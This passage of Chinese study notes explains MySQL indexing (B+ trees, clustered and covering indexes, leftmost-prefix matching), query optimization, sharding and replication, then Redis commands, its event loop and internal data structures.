对于 MyISAM 表，即使是 BLOB 和 TEXT 等长字段，也可以基于其前 500 个字符创建索引。MyISAM 也支持全文索引，这是一种基于分词创建的索引，可以支持复杂的查询。

MyISAM 设计简单，数据以紧密格式存储，所以在某些场景下性能很好。MyISAM 最典型的性能问题还是表锁问题，如果所有的查询长期处于 Locked 状态，那么原因毫无疑问就是表锁。

# 数据库MySQL索引

**索引，**在数据库中是一个排序形式的数据结构，以协助快速查询和更新数据库表中数据。索引的实现通常使用B+树。

**优点**：

- 大大加快数据的检索速度；

- 通过创建唯一性索引，可以保证数据库表中每一行数据的唯一性；
- 在使用分组和排序字句进行数据检索时，显著减少查询中分组和排序的时间；
- 可以在查询的过程中，使用优化隐藏器，提高系统性能。

**缺点**：

- 当对表中数据进行增加删除和修改时，索引需要动态维护，降低了数据的维护速度；
- 创建索引和维护索引需要耗费时间，这种时间随着数据量的增加而增加；
- 需要占用物理空间

**使用条件**：

- 对于非常小的表、大部分简单的全表扫描比建立索引更高效
- 对于中到大型的表，索引非常有效
- 对于特大型的表，建立和维护索引的代价随之增加。这时候需要直接区分处需要查询的一组数据，而不是一条一条的匹配，可以使用分区技术。

### B+Tree 原理

#### 数据结构

B Tree 指的是 Balance Tree，也就是平衡树。平衡树是一颗查找树，并且所有叶子节点位于同一层。

B+ Tree 是基于 B Tree 和**叶子节点顺序访问指针**进行实现，它具有 B Tree 的平衡性，并且通过**顺序访问指针**来提高区间查询的性能。聚簇索引非聚簇索引 联合索引

在 B+ Tree 中，一个节点中的 key 从左到右非递减排列，如果某个指针的左右相邻 key 分别是 keyi 和 keyi+1，且不为 null，则该指针指向节点的所有 key 大于等于 keyi 且小于等于 keyi+1。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-20\b+tree.png" alt="img" style="zoom:60%;" />
</div>


#### 操作

进行查找操作时，首先在根节点进行二分查找，找到一个 key 所在的指针，然后递归地在指针所指向的节点进行查找。直到查找到叶子节点，然后在叶子节点上进行二分查找，找出 key 所对应的 data。

插入删除操作会破坏平衡树的平衡性，因此在进行插入删除操作之后，需要对树进行分裂、合并、旋转等操作来维护平衡性。

#### B+树与红黑树的比较

红黑树等平衡树也可以用来实现索引，但是文件系统及数据库系统普遍采用 B+ Tree 作为索引结构，这是因为使用 B+ 树访问磁盘数据有更高的性能。

**（一）B+ 树有更低的树高**

平衡树的树高 `O(h)=O(logdN)`，其中 d 为每个节点的出度。红黑树的出度为 2，而 B+ Tree 的出度一般都非常大，所以红黑树的树高 h 很明显比 B+ Tree 大非常多。

**（二）磁盘访问原理**

操作系统一般将内存和磁盘分割成固定大小的块，每一块称为一页，内存与磁盘以页为单位交换数据。数据库系统将索引的一个节点的大小设置为页的大小，使得一次 I/O 就能完全载入一个节点。

如果数据不在同一个磁盘块上，那么通常需要移动制动手臂进行寻道，而制动手臂因为其物理结构导致了移动效率低下，从而增加磁盘数据读取时间。B+ 树相对于红黑树有更低的树高，进行寻道的次数与树高成正比，在同一个磁盘块上进行访问只需要很短的磁盘旋转时间，所以 B+ 树更适合磁盘数据的读取。

**（三）磁盘预读特性**

为了减少磁盘 I/O 操作，磁盘往往不是严格按需读取，而是每次都会预读。预读过程中，磁盘进行顺序读取，顺序读取不需要进行磁盘寻道，并且只需要很短的磁盘旋转时间，速度会非常快。并且可以利用预读特性，相邻的节点也能够被预先载入。

#### 为什么B+树对磁盘友好？

- **磁盘读写代价低**：书的非叶子节点没有数据，这样索引较小，可以放在一个block厘米爱你，避免了树形结构不断地向下查找，然后不停的寻道，读数据，这样设计可以降低IO的次数
- **查询效率更加稳定**：非叶子节点并不是最终指向文件内容的节点，而只是叶子节点中关键字的索引，索引任何关键字的查询必须走一条从根节点到叶子节点的路，所有关键字查询的路径长度相同，导致每个数据的查找速率相当。
- **遍历所有的数据更方便**：B+树只要遍历叶子节点就可以实现整个树的遍历。

### MySQL索引

索引是存储引擎用于快速找到记录的一种数据结构。

索引是在存储引擎层实现的，而不是在服务器层实现的，所以不同存储引擎具有不同的索引类型和实现。

#### B+Tree索引

是大多数 MySQL 存储引擎的默认索引类型。

因为不再需要进行全表扫描，只需要对树进行搜索即可，所以查找速度快很多，B+索引在数据库中有一个特点是高出度，因此在数据库中B+树的高度一般都在2-4层，也就是说查询某一键值的行记录最多需要2到4次IO。

因为 B+ Tree 的有序性，所以除了用于查找，还可以用于排序和分组。可以指定多个列作为索引列，多个索引列共同组成键。

适用于全键值、键值范围和键前缀查找，其中键前缀查找只适用于最左前缀查找。如果不是按照索引列的顺序进行查找，则无法使用索引。

InnoDB 的 B+Tree 索引分为**主（聚簇）索引和辅助（非聚簇）索引**。

主索引的叶子节点 data 域记录着完整的数据记录，这种索引方式被称为聚簇索引。因为无法把数据行存放在两个不同的地方，所以一个表只能有一个**聚簇索引**。

辅助索引的叶子节点的data域记录着主键的值，因此在使用辅助索引查找时，需要先查找到**主键值**，然后再到主索引中进行查找。

#### 聚簇索引

按照每张表的主键构造一个B+树，同时叶子节点中存放的即为整张表的行记录数据，也将聚集索引的叶子节点称为数据页。

每个数据页使用双向链表来进行链接。

聚簇索引的存储并不是物理上连续的，而是逻辑上连续的：页通过双向链表链接，页按照主键的顺序排序；每个页中的记录也是通过双向链表进行维护的。

另一个好处是对于主键的排序查找和范围查找速度非常快。

**缺点：**

- 最大限度提交了IO密集型应用的性能，如果数据全部在内存中将会失去优势
- 更新聚簇索引列的代价很高，因为会强制每个被更新的行移动到新位置
- 基于聚簇索引的表插入新行或者主键被更新导致行移动时，可能导致**页分裂**，表会占用更多磁盘空间
- 当行稀疏或由于页分裂导致数据存储不连续时，全表扫描可能很慢。

#### 非聚簇索引（辅助索引）

叶子节点不包含行记录的全部数据，除了包含键值之外，每个叶子节点中的索引行中还包含一个**书签**。

该书签告诉InnoDB引擎哪里可以找到与索引相对应的行数据。在InnoDB中，这个书签就是相应行数据的聚簇索引主键值。

#### 哈希索引

哈希索引能以 O(1) 时间进行查找，但是失去了有序性：

- 无法用于排序与分组；
- 只支持精确查找，**无法用于部分查找和范围查找**。

InnoDB 存储引擎有一个特殊的功能叫“**自适应哈希索引**”，当某个索引值被使用的非常频繁时，会在 B+Tree 索引之上再创建一个哈希索引，这样就让 B+Tree 索引具有哈希索引的一些优点，比如快速的哈希查找。

#### 全文索引

MyISAM 存储引擎支持全文索引，用于**查找文本中的关键词，而不是直接比较是否相等**。

查找条件使用 MATCH AGAINST，而不是普通的 WHERE。

全文索引使用**倒排索引**（第二种表现形式）实现，它记录着关键词到其所在文档的映射。

InnoDB 存储引擎在 MySQL 5.6.4 版本中也开始支持全文索引。

#### 倒排索引

在辅助表（单词存放的表）中存储了单词与单词自身在一个或者多个文档中所在位置之间的映射，这通常利用关联数组实现，拥有两种表现形式：

```
inverted file index: {单词，单词所在的ID}
full inverted index: {单词，(单词所在文档的ID，在具体文档中的位置)}
```

#### 空间数据索引

MyISAM 存储引擎支持空间数据索引（R-Tree），可以用于地理数据存储。空间数据索引会从所有维度来索引数据，可以有效地使用任意维度来进行组合查询。

必须使用 GIS 相关的函数来维护数据。

#### B+树索引的管理

索引的创建和删除可以通过两种方法，一种是`ALTER TABLE`，另一种是`CREATE/DROP INDEX`

#### Cardinality值

并不是所有的查询条件中出现的列都需要添加索引，对于什么时候添加索引，一般是在访问表中很少一部分时使用B+树索引才有意义。

如果某个字段的取值范围很广，几乎没有重复，即属于高选择性，则使用B+树索引是最适合的。

Cardinality值表示索引中不重复记录数量的预估值，不是一个准确值。在实际应用中cardinality/n_rows_in_table应当尽可能接近1.

### InnoDB的主键选择和插入优化

- 在使用InnoDB存储引擎时，如果没有特别的需要，就选择一个与业务无关的自增字段作为主键
- 如果不设置主键，InnoDB会自己设置主键或者添加一列隐藏主键列
- 从数据库优化角度看，必须使用自增主键，因为：
  - 每个叶子节点都有固定的大小，如果存储的data将要溢出，那么mysql会开辟一个新的节点来存储；
    - 1，如果使用自增主键，那么每次插入新的记录，记录就会顺序添加到后续的位置，形成一个紧凑的索引结构，每次插入就不用移动现有数据，所以不会增加很多维护索引的开销
    - 2，如果使用非自增主键，那么每次插入新的记录都是近乎随机，那么就会劈坏已有的索引结构，需要mysql频繁移动记录位置，造成很多碎片。后续不得不通过OPTIMIZE TABLE来重建表并优化填充页面。
- 自增主键和uuid比较：
  - 自增主键：
    - 优点：数据库自动编号，速度快，而且是增量增长，按照顺序存放，对于检索很有利；数字型，占用空间小，易于排序，在程序中传递也方便；如果通过非系统增加记录时，可以不用指定该字段，不用担心主键重复的问题。
    - 缺点：当需要手动导入数据或者与新旧系统双向同步的时候会导致大范围冲突
  - uuid：
    - 优点：出现数据拆分、合并存储的时候，能达到全局的唯一性
    - 缺点：影响插入速度，并且造成硬盘使用率低；作为索引主键，uuid（字符串）之间比较大小相比于数字慢不少，影响查询速度；uuid占空间大，这样如果建立的索引越多，影响越严重。

### 索引优化

#### 多列索引（联合索引）

在需要使用多个列作为条件进行查询时，使用**多列索引比使用多个单列索引性能更好**。

##### 最左前缀原则

建立多列索引时有最左前缀的原则，即最左优先。

例子：如果有一个２列的（col1,col2），则已经对(col1)，(col1,col2)建立了索引。

- B+树的数据项是复合的数据结构，比如(name,age,sex)的时候，B+树是按照从左到右的顺序来建立搜索树的，比如当（张三,20,F）这样的数据来检索的时候，B+树会优先比较name来确定下一部的所搜方向，如果name相同再依次比较age和sex，最后得到检索的数据；但当（20，F）这样的没有name的数据来的时候，B+树就不知道第一步该查哪一个节点，因为建立搜索树的时候name就是第一个比较因子，必须要先根据name来搜索才能知道下一步去哪里查询。
- 比如当以（张三,F）这样的数据来检索时，B+树可以用name来指定搜索方向，但是下一个字段age的缺失，所以只能把名字为张三的数据找到，然后再匹配性别是F的数据，这就是索引的最左匹配特性。

说明：

- 最左前缀匹配原则，mysql会一直向右匹配直到遇到范围查询（>、<、between、like）就停止匹配，比如`a=1 and b=2 and c>3 and d=4`如果建立(a,b,c,d)顺序的索引，d是用不到索引的，如果建立(a,b,d,c)的索引则都可以用到，并且abd的顺序可以任意。
- =和in可以乱序，比如`a=1 and b=2 and c=3`建立(a,b,c)索引可以任意顺序，mysql的查询优化器可以优化成索引可以识别的形式

#### 索引列顺序

让**选择性最强的索引列放在前面**。

索引的选择性是指：不重复的索引值和记录总数的比值。

最大值为 1，此时每个记录都有唯一的索引与其对应。选择性越高，每个记录的区分度越高，查询效率也越高。

#### 前缀索引

对于BLOB，TEXT和VARCHAR类型的列，必须使用前缀索引，只索引开始的那部分字符。

前缀长度的选取需要根据索引选择性来确定。

#### 覆盖索引

辅助索引中包含了所有需要查询的字段的值，可以直接返回不需要再去查询数据库，这种现象称为覆盖索引。

具有以下优点：

- 索引通常远小于数据行的大小，只读取索引能大大减少数据访问量。
- 一些存储引擎（例如 MyISAM）在内存中只缓存索引，而数据依赖于操作系统来缓存。因此，只访问索引可以不使用系统调用（通常比较费时）。
- 对于 InnoDB 引擎，若辅助索引能够覆盖查询，则无需访问主索引。

#### 索引提示

MySQL数据库支持索引提示，即显式的告诉优化器使用哪个索引，在以下情况时使用：

- MYSQL数据库的优化器错误的选择了某个索引，导致sql语句运行的很慢。
- 某sql语句可以选择的索引非常多，这时优化器选择执行计划时间的开销可能会大于sql本身。

#### Multi-Range Read优化

目的是为了减少磁盘的随机访问，并且将随机访问转化为较为顺序的数据访问，这对于IO-bound类型的sql查询语句可带来性能极大的提升。

有以下好处：

- 是数据访问变得较为顺序。在查询辅助索引时，首先根据得到的查询结果，按照主键进行排序，并按照主键排序的顺序进行书签查找。
- 减少缓冲池中页被替换的次数。
- 批量处理对键值的查询操作。

### 索引失效的情况

- 如果索引列出现了隐式类型转换，则Mysql不会使用索引。常见的情况是在sql的where条件中字段类型为字符串，其值为数值，如果没有加引号，那么不会使用索引。
- 如果where条件中含有OR，除非OR前使用了索引列而OR之后是非索引列，否则索引会失效
- Mysql不能在索引中执行like操作，这时底层存储引擎api的限制，最左匹配的like比较会被转换为简单的比较操作，但如果是以通配符开头的like查询，存储引擎就无法做比较。这种情况下mysql只能提取数据行的值而不是索引值来做比较。
- 如果查询中的列不是独立的，则Mysql不会使用索引，独立的列是指索引列不能是表达式的一部分，也不能是函数的参数
- 对于多个**范围条件**查询，mysql无法使用第一个范围列后面的其他索引列，对于多个等值查询则没有这个限制。
- 如果mysql判断全表扫描比使用索引查询更快，则不会使用索引。
- 索引文件具有b-tree的最左前缀匹配特性，如果左边的值未确定，那么无法使用索引。

# MySQL查询优化与主从复制

使用EXPLAIN可以分析select查询语句的性能，可以通过分析EXPLAIN结果来优化查询语句。

其中EXPLAIN结果中比较重要的字段有：

- `select_type:`查询类型，有简单查询、联合查询、自查询等
- `key`：使用的索引
- `rows`：扫描的行数

## 优化Mysql（简要版）

### 硬件和配置的优化

- cpu饱和：CPU在饱和的时候一般发生在数据装入内存或从磁盘上读取数据时候
- io瓶颈：磁盘I/O瓶颈发生在装入数据远大于内存容量的时候，如果应用分布在网络上，那么查询量相当大的时候那么平瓶颈就会出现在网络上

### Mysql内部优化

- sql语句优化
  - 只返回必要的列：最好不要使用select *语句
    - 会查询不需要的列或者大文本的字段，增加数据库解析的工作量，网络开销和磁盘io操作
    - 失去了覆盖索引优化的可能性，比如某一个查询只需要通过辅助索引就可以得到结果，但是用了select*就必须要再去通过聚簇索引去查询所有列，多了一次b+树查询。
  - 只返回必要的行：使用limit语句来限制返回的语句
  - 缓存重复查询的数据：使用缓存可以避免在数据库中进行查询，特别在要查询的数据经常被重复查询时，缓存带来的查询性能提升是非常明显的。

- 索引优化：
  - 使用自增型的主键
  - 索引的长度尽量短，节省索引空间
  - 基数较小的字段建立索引的效果差，需要考虑
- 慢查询优化：用慢查询日志记录查询时间很长的查询语句，然后优化相对应的查询语句
  - 查询时，能不要*就不用*，尽量写全字段名
  - 大部分情况连接效率远大于子查询
  - 多使用explain和profile分析查询语句
  - 查看慢查询日志，找出执行时间长的sql语句优化
  - 多表连接时，尽量小表驱动大表，即小表 join 大表
  - 在千万级分页时使用limit
  - 对于经常使用的查询，可以开启缓存
- 数据表结构优化
  - 表的字段尽可能用NOT NULL
  - 字段长度固定的表查询会更快
  - 把数据库的大表按时间或一些标志分成小表
  - 将表拆分
    - 数据表拆分：主要就是垂直拆分和水平拆分
    - 水平切分：将记录散列到不同的表中，各表的结构完全相同，每次从分表中查询, 提高效率
    - 垂直切分：将表中大字段单独拆分到另外一张表, 形成一对一的关系

## 优化数据访问

#### 减少请求的数据量

- 只返回必要的列：最好不要使用select *语句
- 只返回必要的行：使用limit语句来限制返回的语句
- 缓存重复查询的数据：使用缓存可以避免在数据库中进行查询，特别在要查询的数据经常被重复查询时，缓存带来的查询性能提升是非常明显的。

#### 减少服务端扫描的行数

- 最有效的方式就是使用索引来覆盖查询

## 重构查询方式

#### 切分大查询

一个大查询如果一次性执行的话，可能一次锁住很多数据、占满整个事务日志、耗尽系统资源、阻塞很多小的但重要的查询。

#### 分解大连接查询

将一个大连接查询分解成对每一个表进行一次单表查询，然后在应用程序中进行关联，这样做的好处有：

- 让缓存更高效。对于连接查询，如果其中一个表发生变化，那么整个查询缓存就无法使用。而分解后的多个查询，即使其中一个表发生变化，对其它表的查询缓存依然可以使用。
- 分解成多个单表查询，这些单表查询的缓存结果更可能被其它查询使用到，从而减少冗余记录的查询。
- 减少锁竞争；
- 在应用层进行连接，可以更容易对数据库进行拆分，从而更容易做到高性能和可伸缩。
- 查询本身效率也可能会有所提升。例如下面的例子中，使用 IN() 代替连接查询，可以让 MySQL 按照 ID 顺序进行查询，这可能比随机的连接要更高效。

## MySQL分库分表

主要目的是为了解决单库单表数据过多，查询缓慢的问题，解决数据扩展性问题。

### 数据库瓶颈

#### IO瓶颈

- 磁盘读IO瓶颈，热点数据太多，数据库缓存放不下，每次查询都会产生大量的IO，降低查询速度。**适合分库和垂直分表**
- 网络IO瓶颈，请求的数据太多，网络宽带不够。**适合分库**

#### CPU瓶颈

- SQL问题，比如SQL中包含join，group by，order by，非索引字段条件查询等，增加CPU运算的操作。适合使用SQL优化，建立合适的索引，在业务service层进行业务计算解决。
- 单表数据量太大，查询扫描行太多，SQL效率低，CPU率先出现瓶颈。**适合水平分表**

### 分库

#### 水平分库

以字段为依据，按照一定策略（hash，range等），将一个库中的数据拆分到多个库中。

**场景：**系统绝对并发量上来了，分表难以根本上解决问题，并且还没有明显的业务归属来垂直分库。

#### 垂直分库

以表为依据，按照业务归属不同，将不同的表拆分到不同的库中。

**场景：**系统绝对并发量上来了，并且可以抽象出单独的业务模块。随着业务的发展一些公用的配置表，字典表等越来越多，这是可以将这些表拆到单独的库中，甚至可以服务化。再有，随着业务的发展孵化出了一套业务模式，这时可以将相关的表拆到单独的库中，甚至可以服务化。

### 分表

#### 水平分表

以字段为依据，按照一定策略（hash，range等），将一个表中的数据拆分到多个表中。

**场景：**系统绝对并发量没有上来，只是单表的数据量太多，影响了SQL效率，加重了CPU负担，以至于成为瓶颈。

#### 垂直分表

以字段为依据，按照字段的活跃性，将表中字段拆到不同的表（主表和扩展表）中

**场景：**系统绝对并发量没有上来，表的记录并不多，但是字段多，并且热点数据和非热点数据在一起，单行数据所需的存储空间较大。以至于数据库缓存的数据库减少，查询时回去读取磁盘数据产生大量的随机读IO，产生IO瓶颈。

## MySQL主从复制

### 作用

复制解决的基本问题是让一台服务器的数据与其他服务器保持同步，一台主库的数据可以同步到多台备库上，备库本身也可以被配置成另外一台服务器的主库。主库和备库之间可以有多种不同的组合方式。

MySQL 支持两种复制方式：基于行的复制和基于语句的复制，基于语句的复制也称为逻辑复制，从 MySQL 3.23 版本就已存在，基于行的复制方式在 5.1 版本才被加进来。这两种方式都是通过**在主库上记录二进制日志、在备库重放日志的方式来实现异步的数据复制**。因此同一时刻备库的数据可能与主库存在不一致，并且无法包装主备之间的延迟。

MySQL 复制大部分是**向后兼容**的，新版本的服务器可以作为老版本服务器的备库，但是老版本不能作为新版本服务器的备库，因为它可能无法解析新版本所用的新特性或语法，另外所使用的二进制文件格式也可能不同。

复制解决的问题：**数据分布、负载均衡、备份、高可用性和故障切换、MySQL 升级测试**。

### 步骤

- **在主库上把数据更改记录到二进制文件binary log中**；数据库每次在准备提交事务完成数据更新前，主库将数据更新的事件记录到二进制日志中。Mysql会按照事务提交的顺序而非每条语句的执行顺序来记录二进制文件，在记录二进制日志后，主库会告知存储引擎可以提交事务了。
- **备库将主库的日志复制到自己的中继日志relay log中**；备库首先启动一个工作的IO线程，跟主库建立一个普通的客户端连接，然后再主库上启动一个特殊的二进制转储线程，这个线程会读取主库上二进制日志中的事件。他不会对事件进行轮询。如果该线程最赶上了主库的进度就进入睡眠状态，直到主库发送信号量通知其有新的事件产生时才会被唤醒，备库IO线程会将接收到的事件记录到中继日志中。
- **备库读取中继日志中的事件，将其重放到备库数据库中**；备库的sql线程执行这一步，该线程从中继日志中读取事件并在备库执行，从而实现备库数据的更新。当Sql线程追赶上IO线程时，中继日志通常已经在系统缓存中，所以中继日志的开销很低。SQL 线程执行的时间也可以通过配置选项来决定是否写入其自己的二进制日志中。

## MySQL读写分离

读写分离一般有至少两个数据库，一个主数据库，一个从数据库，主数据库用来写操作，从数据库用来读操作。

### 适合场景

适用于读远大于写的场景，如果只有一台服务器，当select很多时，update和delete会被这些select访问中的数据堵塞，等待select结束，并发性能不高。对于协和读比例相近的应用，应该部署双主相互复制。

### 优点

- 主从只负责各自的写和读，极大程度的缓解X锁和S锁的争用（如果读操作被设置为锁的话，InnoDB一般不会对select加锁，不管是不是在事务中）
- 分摊读取。可以设置一主多从，对读取操作进行分摊。

# 数据库之Redis

## Redis概述（6379）

Redis（Remote Dictionary Server），即远程字典服务。是一个开源的、使用C语言编写、支持网络、可基于内存亦可持久化的日志型、key-value数据库，并提供多种语言的API。

Redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave（主从）同步。

Redis是**单线程**（因为全部数据在内存中，使用单线程可以取消线程切换时的上下文切换资源消耗）的，基于内存操作，CPU不是redis的性能瓶颈，他的瓶颈在于机器的内存和网络带宽。

Redis键的类型只能为字符串，值支持五种数据类型：字符串、列表、集合、散列表、有序集合。

Redis中键值和值都是用`SDS(Simple Dynamic String)`存储。string同C语言一样，末尾保存一个'\0'，但是不计算在len中。

```
struct sdshdr{
	int len;		// 记录buf数组中已使用字节的数量，也就是SDS中字符串的长度
	int free;		// 记录未使用字节的数量
	char buf[];		// 字节数组
};
```

### Redis特性

- 多样的数据类型
- 持久化
- 集群
- 事务

### 基本指令

```
select num	# 默认有16各数据库，num为0-15
keys *		# 查看数据库所有的key
flushdb		# 清空当前库
flushall	# 清空全部的数据库
```

### 重要指令

```bash
KEYS 	*				# 查看所有的key
SET 	_key _value		# 设置key
GET 	_key			# 获取key的value
EXISTS 	_key			# 判断key是否存在
MOVE 	_key _num		# 将指定key移动到num号数据库
EXPIRE 	_key _sec		# 设置key过期时间，单位是秒
TTL 	_key			# 查看key的剩余时间
TYPE	_key			# 查看key的类型
```

## Redis和Memcached区别

### Redis优点

- 支持多种数据结构，如 string（字符串）、 list(双向链表)、dict(hash表)、set(集合）、zset(排序set)
- 支持持久化操作，可以进行aof及rdb数据持久化到磁盘，从而进行数据备份或数据恢复等操作，较好的防止数据丢失的手段。
- 支持通过Replication进行数据复制，通过master-slave机制，可以实时进行数据的同步复制，支持多级复制和增量复制，master-slave机制是Redis进行HA的重要手段。
- 单线程请求，所有命令串行执行，并发情况下不需要考虑数据一致性问题。
- 支持pub/sub消息订阅机制，可以用来进行消息订阅与通知。

### Redis缺点

- Redis只能使用单线程，性能受限于CPU性能，故单实例CPU最高才可能达到5-6wQPS每秒（取决于数据结构，数据大小以及服务器硬件性能，日常环境中QPS高峰大约在1-2w左右）。
- 支持简单的事务需求，但业界使用场景很少，并不成熟，既是优点也是缺点。
- Redis在string类型上会消耗较多内存，可以使用dict（hash表）压缩存储以降低内存耗用。

### Memcached优点

- Memcached可以利用多核优势，单实例吞吐量极高，可以达到几十万QPS（取决于key、value的字节大小以及服务器硬件性能，日常环境中QPS高峰大约在4-6w左右）。适用于最大程度扛量。
- 支持直接配置为session handle。

### Memcache缺点

- 只支持简单的key/value数据结构，不像Redis可以支持丰富的数据类型。
- 无法进行持久化，数据不能备份，只能用于缓存使用，且重启后数据全部丢失。
- 无法进行数据同步，不能将MC中的数据迁移到其他MC实例中。
- Memcached内存分配采用Slab Allocation机制管理内存，value大小分布差异较大时会造成内存利用率降低，并引发低利用率时依然出现踢出等问题。需要用户注重value设计。

### 区别

两者都是非关系型内存键值数据库，主要有以下不同：

- **网络IO模型**：Redis使用单线程的IO复用模型，自己封装了一个简单的AeEvent事件处理框架，主要实现了epoll，kqueue和select，对于单存只有IO操作来说，单线程可以将速度优势发挥到最大；Memcached是多线程，非阻塞IO复用的网络模型，分为监听主线程和worker子线程，主线程监听网络连接，接受请求后，将连接描述字pipe传递给worker线程，进行读写IO，网络层使用libevent封装的事件库，多线程模型可以发挥多核作用，但是引入了cache coherency和锁的问题。

- **数据类型：**Redis支持五种不同的类型，可以更灵活的解决问题；Memcached仅支持字符串类型
- **数据持久化：**Redis支持两种持久化策略（RDB快照和AOF日志）；Memcached不支持持久化
- **分布式：**Redis Cluster实现了对分布式的支持；Memcached不支持分布式，只能通过在客户端使用一致性哈希来实现分布式存储，这种方式在存储和查询时都需要先在客户端计算一次数据所在的节点。
- **内存管理机制：**
  - Redis中，并不是所有的数据都一直在内存中，可以将一些很久没用的value交换到磁盘；Memcached的数据一直在内存中。
  - Memcached将内存分割为特定长度的块来存储数据，以解决内存碎片的问题，但是这种方式会导致内存使用率不高。

## redis事件驱动详解

#### 事件驱动数据结构

- 事件循环结构体aeEventLoop：事件循环结构体维护 I/O 事件表，定时事件表和触发事件表。
  - 文件事件结构体：aefileevent
  - 时间事件结构体：aetimeevent
  - 触发事件结构体：aefiredevent

- redis 的主函数中调用 initServer() 函数从而初始化事件循环中心（EventLoop），它的主要工作是在 aeCreateEventLoop() 中完成的。

#### 事件驱动原理

- 事件注册：文件 I/O 事件注册主要操作在 aeCreateFileEvent() 中完成。aeCreateFileEvent() 会根据文件描述符的数值大小在事件循环结构体的 I/O 事件表中取一个数据空间，利用系统提供的 I/O 多路复用技术监听感兴趣的 I/O 事件，并设置回调函数。

  - 对于不同版本的 I/O 多路复用，比如 epoll，select，kqueue 等，redis 有各自的版本，但接口统一，譬如 aeApiAddEvent()，会有多个版本的实现。
  - ![img](http://daoluan.net/redis-source-notes/assets/event-model-1.png)

- 准备监听的工作：redis 提供了 TCP 和 UNIX 域套接字两种工作方式。以 TCP 工作方式为例，listenPort() 创建绑定了套接字并启动了监听

- 为监听的套接字注册事件：initServer() 为所有的监听套接字注册了读事件（读事件表示有新的连接到来），响应函数为 acceptTcpHandler() 或者 acceptUnixHandler()。

  - acceptCommonHandler() 主要工作就是：
    - 建立并保存服务端与客户端的连接信息，这些信息保存在一个 struct redisClient 结构体中；
    - 为与客户端连接的套接字注册读事件，相应的回调函数为 readQueryFromClient()，readQueryFromClient() 作用是从套接字读取数据，执行相应操作并回复客户端。

- 进入事件循环：发生在 aeProcessEvents() 中：

  - 根据定时事件表计算需要等待的最短时间；
  - 调用 redis api aeApiPoll() 进入监听轮询，如果没有事件发生就会进入睡眠状态，其实就是 I/O 多路复用 select() epoll() 等的调用；
  - 有事件发生会被唤醒，处理已触发的 I/O 事件和定时事件。

- aeApiPoll() 调用了 select() 进入了监听轮询。aeApiPoll() 的 tvp 参数是最小等待时间，它会被预先计算出来，它主要完成：

  - 拷贝读写的 fdset。select() 的调用会破坏传入的 fdset，实际上有两份 fdset，一份作为备份，另一份用作调用。每次调用 select() 之前都从备份中直接拷贝一份；
  - 调用 select()；
  - 被唤醒后，检查 fdset 中的每一个文件描述符，并将可读或者可写的描述符记录到触发表当中。

  接下来的操作便是执行相应的回调函数，先处理 I/O 事件，再处理定时事件。

## redis如何提供服务

#### 详细过程

- 初始化：redis 在启动做了一些初始化逻辑，比如配置文件读取（initserverconfig），数据中心初始化，网络通信模块初始化等（initserver），待所有初始化任务完毕后，便开始进入事件循环等待请求（aemain）。
- redis 注册了回调函数 acceptTcpHandler()，当有新的连接到来时，这个函数会被回调

- 获取客户端的数据：readQueryFromClient() 则是获取来自客户端的数据，接下来它会调用 processInputBuffer() 解析命令和执行命令，对于命令的执行，调用的是函数 processCommand()。
  - redis 首先根据客户端给出的命令字在命令表中查找对应的 c->cmd, 找到命令结构提之后直接调用相应的回调函数指针

## Redis数据结构

### SDS

简单动态字符串（simple dynamic string），redis中使用sds作为默认字符串。

```c
struct sdshdr{
    // 1 bytes
	uint8_t len;		// 字符串长度
    // 1 bytes
	uint8_t free;		// buf数组中未使用的字节数量
	// 1 bytes
    unsigned char flags;
	char buf[];		// 字符串数组，最后有一个隐式的'\0'
};
```

#### 与C字符串区别

- 常数时间复杂度获取字符串长度
- 不会发生缓冲区溢出，由于sds知道自己的字符串长度和剩余空间，所以当不足时可以自动扩展空间
- 减少修改字符串时带来的内存重分配次数。
  - sds通过未使用空间解除了字符串长度和底层数组长度之间的关联；SDS通过未使用空间实现了空间预分配和惰性空间释放两种优化策略
  - 空间预分配：用于优化字符串增长操作，当sds需要扩展空间的时候，程序不仅会对sds分配修改所需要的空间，同时还会为sds分配额外的未使用空间。
    - 如果扩展之后空间小于1M，程序会分配和len属性大小相同的未使用空间，即len=free
    - 如果大于1M，程序会额外分配1M的未使用空间，即free=1M
  - 惰性空间释放：用于优化sds的缩短操作，当sds需要缩短空间的时候，程序不立即使用内存重分配来回收缩短后多出来的字节，而是使用free属性将其存起来。
- 二进制安全，C字符串只能保存文本数据，sds可以保存文本或者二进制数据，可以识别出'\0'
- 兼容部分C字符串函数

### 链表list

双端，无环，带有表头指针和表尾指针，带链表长度计数器。

多态：链表节点使用void*指针来保存节点值，并且通过list结构的dup、free、match三个属性为节点值设置类型特定函数，所以链表可以用于保存各种不同类型的值。

```c++
typedef struct listNode{
	struct listNode *pre;
	struct listNode *next;
	void* value;
};

typedef sturct list{
	listNode *head;
	listNode *tail;
	unsigned long len;
	void *(*dup) (void *ptr);		// 节点值复制函数
	void (*free) (void *ptr);		// 节点值释放函数
	int (*match) (void *ptr, void *key);	// 节点值对比函数
}list;
```

### 字典

`dictht`是一个散列表结构，使用拉链法解决哈希冲突。

```c++
// 一个哈希表结构，每个字典有两个这样的结构
typedef struct dictht{
	dictEntry **table;			// 哈希表数组
	unsigned long size;			// 哈希表大小
	unsigned long sizemask;		// 哈希表大小掩码，用于计算索引值，总是等于size-1
	unsigned long used;			// 该哈希表已有节点的数量
}dictht;

// 哈希表节点结构
typedef struct dictEntry{
	void *key;			// 键
	union{				// 值
		void *val;
		uint64_t u64;
		int64_t s64;
		double d;
	}v;
	struct dictEntry *next;	// 指向下一个哈希表节点，形成链表，用来解决键冲突
}dictEntry;
```

`Redis`的字典`dict`包含两个哈希表`dictht`，这是为了方便进行`rehash`操作，在扩容时，将其中一个`dictht`上的键值对`rehash`到另一个`dictht`上面，完成之后释放空间并交换两个`dictht`的角色。

```c++
typedef struct dict{
	dictType *type;			// 类型特定函数
	void *privdata;			// 私有数据
	dictht ht[2];			// 哈希表，一般只使用ht[0]，ht[1]是用来rehash的
	long rehashidx;			// 记录rehash目前的进度，如果没有进行rehash他的值为-1
	unsigned long iterators;// 当前运行的迭代器的数量
}dict;
```

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\normdic.png" alt="img" style="zoom:90%;" />
</div>

#### 字典中的哈希算法

```c
hash = dict->type->hashFunction(key);
index = hash & index->ht[0].sizemask;
```

#### 字典解决键冲突（哈希冲突）

